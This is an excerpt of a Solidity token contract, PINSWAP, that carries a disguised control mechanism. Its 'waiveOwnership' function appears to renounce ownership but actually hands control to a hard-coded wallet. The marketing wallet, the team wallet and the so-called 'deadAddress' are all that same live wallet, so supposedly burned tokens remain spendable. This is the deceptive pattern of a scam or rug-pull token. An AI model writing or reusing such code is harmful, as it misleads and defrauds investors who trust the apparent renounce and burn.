...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xd259F82B4fdda88449868f86126F7F0d9E13beB3));
        _owner = address(0xd259F82B4fdda88449868f86126F7F0d9E13beB3);
    }
...
contract PINSWAP is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PINSWAP";
    string private _symbol = "PINSWAP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd259F82B4fdda88449868f86126F7F0d9E13beB3);
    address payable public teamWalletAddress = payable(0xd259F82B4fdda88449868f86126F7F0d9E13beB3);
    address public immutable deadAddress = 0xd259F82B4fdda88449868f86126F7F0d9E13beB3;
    ...
    uint256 private _totalSupply =  888 * 10**_decimals;
    uint256 public _maxTxAmount =   888 * 10**_decimals; 
    uint256 public _walletMax =     888 * 10**_decimals;
